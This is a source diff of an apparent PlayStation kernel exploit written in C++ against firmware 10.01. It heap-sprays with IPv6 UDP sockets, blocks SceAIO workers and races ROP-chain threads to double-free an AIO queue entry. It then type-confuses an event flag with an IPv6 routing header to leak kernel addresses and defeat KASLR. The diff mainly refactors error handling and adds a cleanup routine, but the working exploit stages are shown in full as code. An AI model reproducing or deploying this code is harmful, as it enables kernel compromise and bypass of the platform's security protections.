@@ -99,28 +99,21 @@ struct setup_s
 };
 setup_s setup_data = {0};
 
-void setup()
+int32_t setup()
 {
-    setup_data.timeout = 1;
-
-    printf_debug("STAGE: Setup\n");
+    printf_debug("STAGE 0: Setup\n");
 
     // CPU pinning and priority
     err = cpu_affinity_priority();
     if (err) goto end;
+
+    printf_debug("* Blocking SceAIO...\n");
 
     // Create a unix socketpair to use as a blocking primitive
     err = create_unixpair(&setup_data.unixpair);
     if (err) goto end;
     printf_debug("Unix socketpair created: block_fd %d unblock_fd %d\n",
         setup_data.unixpair.block_fd, setup_data.unixpair.unblock_fd);
-
-    // Heap spraying/grooming with AF_INET6 UDP sockets
-    for (uint32_t i = 0; i < NUM_SDS; i++) {
-        setup_data.sds[i] = create_ipv6udp();
-        setup_data.sock_count += (setup_data.sds[i] < 0) ? 0 : 1;
-    }
-    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n", setup_data.sock_count);
 
     // This part will block the worker threads from processing entries so that
     // we may cancel them instead. this is to work around the fact that
@@ -139,7 +132,7 @@ void setup()
     );
     printf_debug("Worker AIOs submitted with ID: %d\n", setup_data.worker_id);
 
-    {// Check if AIO is blocked
+    // Check if AIO is blocked
     setup_data.test_req.fd = -1;
     aio_submit_cmd(
         SCE_KERNEL_AIO_CMD_READ,
@@ -150,7 +143,8 @@ void setup()
     );
     printf_debug("AIO test submitted with ID: %d\n", setup_data.test_id);
 
-    reset_errno(); // Reset errno
+    reset_errno();
+    setup_data.timeout = 1;
     aio_multi_wait(
         &setup_data.test_id,
         1,
@@ -158,22 +152,30 @@ void setup()
         SCE_KERNEL_AIO_WAIT_AND,
         &setup_data.timeout
     );
-    err = read_errno();
-    printf_debug("aio_multi_wait errno %d\n", err);
     printf_debug("aio_multi_wait err[0] %d\n", aio_errs[0]);
 
+    err = read_errno();
     if (err != 60) { // ETIMEDOUT
-        err = -1;
-        free_aios(&setup_data.test_id, 1);
         printf_debug("SceAIO system not blocked. errno: %ld\n", err);
+        err = -1;
         goto end;
     }
-    err = 0;
+    printf_debug("SceAIO system blocked! errno: %ld\n", err);
     free_aios(&setup_data.test_id, 1);
-    printf_debug("SceAIO system blocked!\n");
-    }
+    setup_data.test_id = 0; // Skip cleanup
+    err = 0;
 
-    // Groom the heap
+    printf_debug("* Spraying/grooming the heap...\n");
+
+    // Heap spraying/grooming with AF_INET6 UDP sockets
+    for (uint32_t i = 0; i < NUM_SDS; i++) {
+        setup_data.sds[i] = create_ipv6udp();
+        setup_data.sock_count += (setup_data.sds[i] < 0) ? 0 : 1;
+    }
+    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n",
+        setup_data.sock_count);
+
+    // Groom the heap with AIO requests
     for (uint32_t i = 0; i < NUM_GROOM_REQS; i++) {
         setup_data.groom_reqs[i].fd = -1;
     }
@@ -190,14 +192,10 @@ void setup()
     printf_debug("Heap groomed with %d AIOs!\n", NUM_GROOM_IDS);
 
     end:
-        printf_debug("* errno value %d\n", read_errno());
+        return err;
 }
 
-struct in6_addr
-{
-    uint8_t s6_addr[16];
-};
-
+struct in6_addr { uint8_t s6_addr[16]; };
 template <size_t size>
 struct ip6_rthdr
 {
@@ -260,7 +258,7 @@ int32_t make_aliased_rthdrs()
 #define SIZE_TCP_INFO 0xec // Size of the TCP info structure
 #define TCPS_ESTABLISHED 4
 
-ScePthreadBarrier barrier;
+ScePthreadBarrier barrier = 0;
 int32_t race_errs[2] = {0};
 uint8_t thr_chain_buf[0x4000] __attribute__((aligned(16))) = {0};
 uint8_t chain_buf[0x200] __attribute__((aligned(16))) = {0};
@@ -270,7 +268,6 @@ int32_t race_one(
     int32_t sd_conn
 )
 {
-    printf_debug("SceKernelAioSubmitId: %d sd_conn: %d\n", id, sd_conn);
     ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
     ROP_Chain chain = ROP_Chain((uint64_t*)chain_buf, 0x200);
     if (!thr_chain.is_initialized() || !chain.is_initialized())
@@ -324,11 +321,10 @@ int32_t race_one(
     }
 
     ScePthread thread = 0;
-    if (thr_chain.execute(&thread) != 0)
-    {
-        printf_debug("Failed to execute thread's ROP chain!\n");
-        return -1;
-    }
+    err = thr_chain.execute(&thread);
+    if (err) printf_debug("Failed to execute thread's ROP chain!\n");
+    if (err) return err;
+
     uint64_t thread_id = DEREF(thread);
     printf_debug("Thread spawned! ID: %ld\n", thread_id);
 
@@ -350,8 +346,6 @@ int32_t race_one(
     while (rax == 0)
         PS::Breakout::call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));
 
-    printf_debug("RAX: %d\n", rax); // Should be 1
-
     int64_t ret = -1;
     {
     // Enter the barrier as the last waiter
@@ -371,11 +365,10 @@ int32_t race_one(
     chain.get_result(&ret);
     }
 
-    if (chain.execute() != 0)
-    {
-        printf_debug("Failed to execute ROP chain!\n");
-        return -1;
-    }
+    err = chain.execute();
+    if (err) printf_debug("Failed to execute ROP chain!\n");
+    if (err) return err;
+
     printf_debug("ROP chain executed!\n");
 
     if (ret != 0)
@@ -395,25 +388,20 @@ int32_t race_one(
     // Get TCP info
     uint8_t info_buf[SIZE_TCP_INFO] = {0};
     socklen_t info_size = SIZE_TCP_INFO;
-    PS::getsockopt(
+    err = PS::getsockopt(
         sd_conn, IPPROTO_TCP, TCP_INFO, info_buf, &info_size
     );
 
-    if (info_size != SIZE_TCP_INFO) {
-        printf_debug("Failed to get TCP info: info_size isn't %d: %d\n",
+    if (err || info_size != SIZE_TCP_INFO) {
+        printf_debug("Failed to get TCP info! SIZE_TCP_INFO %d info_size %d\n",
             SIZE_TCP_INFO, info_size);
-        // Move these
         PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
         scePthreadJoin(thread, 0); // Wait for the thread to finish
         printf_debug("Thread exited.\n");
         return -1;
     }
 
-    // log info_buf
-    // printf_debug("info_buf: ");
-    // for (uint32_t i = 0; i < info_size; i++)
-    //     printf_debug("0x%02x ", info_buf[i]);
-    // printf_debug("\n");
+    printf_debug("TCP info retrieved! info_size: %d\n", info_size);
 
     uint8_t tcp_state = info_buf[0];
     printf_debug("tcp_state: %d\n", tcp_state);
@@ -449,17 +437,21 @@ int32_t race_one(
     return -1;
 }
 
+
+int32_t sd_listen = -1;
+
 int32_t double_free_reqs()
 {
-    printf_debug("STAGE: Double free AIO queue entry\n");
+    printf_debug("STAGE 1: Double free AIO queue entry\n");
+
+    err = scePthreadBarrierInit(&barrier, 0, 2, 0);
+    if (err) return err;
+    printf_debug("Barrier initialized! %p\n", barrier);
 
     sockaddr_in server_addr = {0};
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = PS::htons(5050);
     server_addr.sin_addr.s_addr = PS::htonl(0x7f000001); // 127.0.0.1
-
-    scePthreadBarrierInit(&barrier, 0, 2, 0);
-    printf_debug("Barrier initialized! %p\n", barrier);
 
     SceKernelAioRWRequest reqs[NUM_REQS] = {0};
     SceKernelAioSubmitId req_ids[NUM_REQS] = {0};
@@ -468,26 +460,36 @@ int32_t double_free_reqs()
     for (uint32_t i = 0; i < NUM_REQS; i++)
         reqs[i].fd = -1;
 
-    int32_t sd_listen = PS::socket(AF_INET, SOCK_STREAM, 0);
+    sd_listen = PS::socket(AF_INET, SOCK_STREAM, 0);
+    if (sd_listen < 0) printf_debug("Failed to create sd_listen: %p\n", read_errno());
+    if (sd_listen < 0) return -1;
+
     int32_t optval = 1;
-    PS::setsockopt(
-        sd_listen, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int32_t)
-    );
-    if (PS::bind(sd_listen, (sockaddr*)&server_addr, sizeof(sockaddr_in)) != 0)
-    {
-        printf_debug("Failed to bind socket: %p\n", read_errno());
-    }
-    if (PS::listen(sd_listen, 1) != 0)
-    {
-        printf_debug("Failed to listen on socket: %p\n", read_errno());
-    }
+    err = PS::setsockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int32_t));
+    if (err) printf_debug("Failed to set SO_REUSEADDR on sd_listen: %p\n", read_errno());
+    if (err) return err;
+
+    err = PS::bind(sd_listen, (sockaddr*)&server_addr, sizeof(sockaddr_in));
+    if (err) printf_debug("Failed to bind socket: %p\n", read_errno());
+    if (err) return err;
+    
+    err = PS::listen(sd_listen, 1);
+    if (err) printf_debug("Failed to listen on socket: %p\n", read_errno());
+    if (err) return err;
 
     for (uint32_t i = 0; i < NUM_RACES; i++) {
         int32_t sd_client = PS::socket(AF_INET, SOCK_STREAM, 0);
-        printf_debug("sd_listen: %d sd_client: %d\n", sd_listen, sd_client);
+        if (sd_client < 0) printf_debug("Failed to create sd_client: %p\n", read_errno());
+        if (sd_client < 0) continue;
+
         PS::connect(sd_client, (sockaddr *)&server_addr, sizeof(server_addr));
         int32_t sd_conn = PS::accept(sd_listen, 0, 0);
-        printf_debug("sd_conn: %d\n", sd_conn);
+        if (sd_conn < 0) {
+            printf_debug("Failed to establish connection: %p\n", read_errno());
+            PS::close(sd_client);
+            continue;
+        }
+
         // Force soclose() to sleep
         linger optval_client = {1, 1};
         if (PS::setsockopt(
@@ -495,9 +497,15 @@ int32_t double_free_reqs()
         ) != 0)
         {
             printf_debug("Failed to set SO_LINGER on client socket: %p\n", read_errno());
+            PS::close(sd_conn);
+            PS::close(sd_client);
+            continue;
         }
-        reqs[WHICH_REQ].fd = sd_client;
 
+        printf_debug("sd_listen: %d sd_client: %d sd_conn: %d\n",
+            sd_listen, sd_client, sd_conn);
+
+        reqs[WHICH_REQ].fd = sd_client;
         aio_submit_cmd(
             SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI,
             reqs,
@@ -514,17 +522,18 @@ int32_t double_free_reqs()
         // Drop the reference so that aio_multi_delete() will trigger _fdrop()
         PS::close(sd_client);
 
-        int32_t ret = race_one(req_ids[WHICH_REQ], sd_conn);
+        err = race_one(req_ids[WHICH_REQ], sd_conn);
 
         // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got 
         // decremented twice. this will leave one request undeleted
         aio_multi_delete(req_ids, NUM_REQS, req_errs);
         PS::close(sd_conn);
 
-        if (ret == 0) {
+        if (!err) {
             printf_debug("Won race at attempt %d\n", i);
             PS::close(sd_listen);
             scePthreadBarrierDestroy(&barrier);
+            barrier = 0;
             return 0;
         }
     }
@@ -597,19 +606,29 @@ bool verify_reqs2(aio_entry *reqs2)
 #define NUM_ELEMS (0x100 / sizeof(SceKernelAioRWRequest))
 #define NUM_LEAKS 5
 
-int32_t leak_kernel_addrs()
+struct stage2_s
 {
-    printf_debug("STAGE: Leak kernel addresses\n");
-
-    PS::close(sd_pair[1]);
     uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};
     socklen_t len = 0x80;
+    SceKernelEventFlag evf = 0;
+    ptr64_t evf_cv_str_p = 0;
+    ptr64_t evf_p = 0;
+    ptr64_t reqs1 = 0;
+    aio_entry *req2 = 0;
+    SceKernelAioSubmitId target_id = 0;
+};
+stage2_s stage2_data;
+
+int32_t leak_kernel_addrs()
+{
+    printf_debug("STAGE 2: Leak kernel addresses\n");
+
+    PS::close(sd_pair[1]);
 
     // Type confuse a struct evf with a struct ip6_rthdr
     printf_debug("* Confuse evf with rthdr\n");
 
     SceKernelEventFlag evfs[NUM_HANDLES];
-    SceKernelEventFlag evf = 0;
 
     for (uint32_t i = 0; i < NUM_ALIAS; i++)
     {
@@ -620,30 +639,30 @@ int32_t leak_kernel_addrs()
             // `| j << 16` bitwise shenanigans will help locating evfs later
             new_evf(&evfs[j], 0x0f00 | j << 16);
 
-        get_rthdr(sd_pair[0], buf, &len);
-        uint32_t bit_pattern = ((uint32_t*)buf)[0];
+        get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+        uint32_t bit_pattern = ((uint32_t*)stage2_data.buf)[0];
         if ((bit_pattern >> 16) < NUM_HANDLES)
         {
-            evf = evfs[bit_pattern >> 16];
+            stage2_data.evf = evfs[bit_pattern >> 16];
             // Confirm our finding
-            set_evf_flags(evf, bit_pattern | 1);
-            get_rthdr(sd_pair[0], buf, &len);
-            if (((uint32_t*)buf)[0] == (bit_pattern | 1))
+            set_evf_flags(stage2_data.evf, bit_pattern | 1);
+            get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+            if (((uint32_t*)stage2_data.buf)[0] == (bit_pattern | 1))
                 evfs[bit_pattern >> 16] = 0;
             else
-                evf = 0;
+                stage2_data.evf = 0;
         }
 
         for (uint32_t j = 0; j < NUM_HANDLES; j++)
             if (evfs[j] != 0) free_evf(evfs[j]);
 
-        if (evf == 0) continue;
+        if (stage2_data.evf == 0) continue;
         printf_debug("Confused rthdr and evf at attempt: %d\n", i);
-        hexdump(buf, 0x80);
+        hexdump(stage2_data.buf, 0x80);
         break;
     }
 
-    if (evf == 0)
+    if (stage2_data.evf == 0)
     {
         printf_debug("Failed to confuse evf with rthdr!\n");
         return -1;
@@ -664,32 +683,33 @@ int32_t leak_kernel_addrs()
     // evf.cv.cv_description = "evf cv"
     // string is located at the kernel's mapped ELF file
     // 0x007b5133 "evf cv" for FW 10.01.
-    ptr64_t evf_cv_str_p = *(uint64_t*)(&buf[0x28]);
+    stage2_data.evf_cv_str_p = *(uint64_t*)(&stage2_data.buf[0x28]);
 
-    printf_debug("\"evf cv\" string address found! %p\n", evf_cv_str_p);
+    printf_debug("\"evf cv\" string address found! %p\n",
+        stage2_data.evf_cv_str_p);
     printf_debug("DEFEATED KASLR! Kernel base (10.01): %p\n",
-        evf_cv_str_p - 0x007b5133);
+        stage2_data.evf_cv_str_p - 0x007b5133);
 
     // Because of TAILQ_INIT() (a linked list macro), we have:
     // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
     // It's the real address of the leaked `evf` object in the kernel heap
     // For what are we going to use this??
-    ptr64_t evf_p = *(uint64_t*)(&buf[0x40]) - (uint64_t)0x38;
+    stage2_data.evf_p = *(uint64_t*)(&stage2_data.buf[0x40]) - (uint64_t)0x38;
     
     // %p only works for 64-bit addresses when prefixed with 0xffffffff
     // for some reason.. We can blame PS2::vsprintf for that.
     printf_debug("Leaked evf address (kernel heap): 0x%08x%08x\n",
-        (uint32_t)(evf_p >> 32), (uint32_t)evf_p);
+        (uint32_t)(stage2_data.evf_p >> 32), (uint32_t)stage2_data.evf_p);
 
     // Setting rthdr.ip6r_len to 0xff, allowing to read the next 0x80 blocks,
     // leaking adjacent objects
-    set_evf_flags(evf, 0xff00);
-    len *= NUM_LEAKED_BLOCKS;
+    set_evf_flags(stage2_data.evf, 0xff00);
+    stage2_data.len *= NUM_LEAKED_BLOCKS;
 
     // Use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
     // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
     // field ???
-    ptr64_t ucred = evf_p + 4;
+    ptr64_t ucred = stage2_data.evf_p + 4;
 
     SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
     SceKernelAioSubmitId leak_ids[NUM_ELEMS * NUM_HANDLES] = {0};
@@ -710,12 +730,12 @@ int32_t leak_kernel_addrs()
             true,
             SCE_KERNEL_AIO_CMD_WRITE
         );
-        get_rthdr(sd_pair[0], buf, &len);
-        for (uint32_t off = 0x80; off < len; off += 0x80) {
-            if (!verify_reqs2((aio_entry *)&buf[off])) continue;
+        get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+        for (uint32_t off = 0x80; off < stage2_data.len; off += 0x80) {
+            if (!verify_reqs2((aio_entry *)&stage2_data.buf[off])) continue;
             reqs2_off = off;
             printf_debug("Found reqs2 at attempt: %d\n", i);
-            hexdump(&buf[off], 0x80);
+            hexdump(&stage2_data.buf[off], 0x80);
             goto loop_break;
         }
         free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
@@ -727,36 +747,39 @@ int32_t leak_kernel_addrs()
         return -1;
     }
     printf_debug("reqs2 offset: %p\n", reqs2_off);
-    aio_entry *req2 = (aio_entry *)&buf[reqs2_off];
+    stage2_data.req2 = (aio_entry *)&stage2_data.buf[reqs2_off];
 
-    ptr64_t reqs1 = req2->ar2_reqs1;
-    printf_debug("reqs1: 0x%08x%08x\n", (uint32_t)(reqs1 >> 32), (uint32_t)reqs1);
-    reqs1 &= -0x100LL;
-    printf_debug("reqs1: 0x%08x%08x\n", (uint32_t)(reqs1 >> 32), (uint32_t)reqs1);
+    stage2_data.reqs1 = stage2_data.req2->ar2_reqs1;
+    printf_debug("reqs1: 0x%08x%08x\n", 
+        (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);
+    stage2_data.reqs1 &= -0x100LL;
+    printf_debug("reqs1: 0x%08x%08x\n",
+        (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);
 
     printf_debug("* Searching target_id\n");
-    SceKernelAioSubmitId target_id = 0;
+
     SceKernelAioSubmitId *to_cancel_p = 0;
     uint32_t to_cancel_len = 0;
 
     for (uint32_t i = 0; i < NUM_ELEMS * NUM_HANDLES; i += NUM_ELEMS)
     {
         aio_multi_cancel(&leak_ids[i], NUM_ELEMS, aio_errs);
-        get_rthdr(sd_pair[0], buf, &len);
-        if (req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED) continue;
+        get_rthdr(sd_pair[0], stage2_data.buf, &stage2_data.len);
+        if (stage2_data.req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED)
+            continue;
         printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
-        hexdump((uint8_t *)req2, 0x80);
+        hexdump((uint8_t *)stage2_data.req2, 0x80);
         // Why do we assume that target_id is the first one in the batch?
         // It could be any of the `NUM_ELEMS`, right?
-        target_id = leak_ids[i];
-        leak_ids[i] = 0; // target_id won't be processed by free_aios2
-        printf_debug("target_id: %p\n", target_id);
+        stage2_data.target_id = leak_ids[i];
+        leak_ids[i] = 0; // target_id won't be freed by free_aios2
+        printf_debug("target_id: %p\n", stage2_data.target_id);
         to_cancel_p = &leak_ids[i + NUM_ELEMS];
         to_cancel_len = (NUM_ELEMS * NUM_HANDLES) - (i + NUM_ELEMS);
         break;
     }
 
-    if (target_id == 0)
+    if (stage2_data.target_id == 0)
     {
         printf_debug("Failed to find target_id!\n");
         free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
@@ -767,6 +790,38 @@ int32_t leak_kernel_addrs()
     free_aios2(leak_ids, NUM_ELEMS * NUM_HANDLES);
 
     return 0;
+}
+
+void cleanup()
+{
+    // Close unix socketpair
+    PS::close(setup_data.unixpair.unblock_fd);
+    PS::close(setup_data.unixpair.block_fd);
+
+    // Free worker AIOs
+    free_aios(&setup_data.worker_id, 1);
+
+    // Free test AIO
+    if (setup_data.test_id != 0)
+        free_aios(&setup_data.test_id, 1);
+
+    // Close all sprayed sockets
+    for (uint32_t i = 0; i < NUM_SDS; i++)
+        if (setup_data.sds[i] >= 0)
+            PS::close(setup_data.sds[i]);
+    
+    // Free groomed AIOs
+    free_aios2(setup_data.groom_ids, NUM_GROOM_IDS);
+
+    // Close sd_listen
+    if (sd_listen > 0) PS::close(sd_listen);
+
+    // Destroy the pthread barrier
+    if (barrier != 0) scePthreadBarrierDestroy(&barrier);
+
+    // Close sd_pair[0]
+    if (sd_pair[0] > 0) PS::close(sd_pair[0]);
+
 }
 
 void main()
@@ -785,20 +840,16 @@ void main()
     syscall_init();
 
     // STAGE: Setup
-    setup();
-    if (err) goto end;
+    if (setup() != 0) goto end;
 
     // STAGE: Double free AIO queue entry
-    err = double_free_reqs();
-    if (err) goto end;
+    if (double_free_reqs() != 0) goto end;
 
     // STAGE: Leak kernel addresses
-    err = leak_kernel_addrs();
-    if (err) goto end;
+    if (leak_kernel_addrs() != 0) goto end;
 
     end:
-        PS::close(setup_data.unixpair.unblock_fd);
-        PS::close(setup_data.unixpair.block_fd);
+        cleanup();
         if (err != 0)
         {
             printf_debug("Something went wrong! Error: %d\n", err);
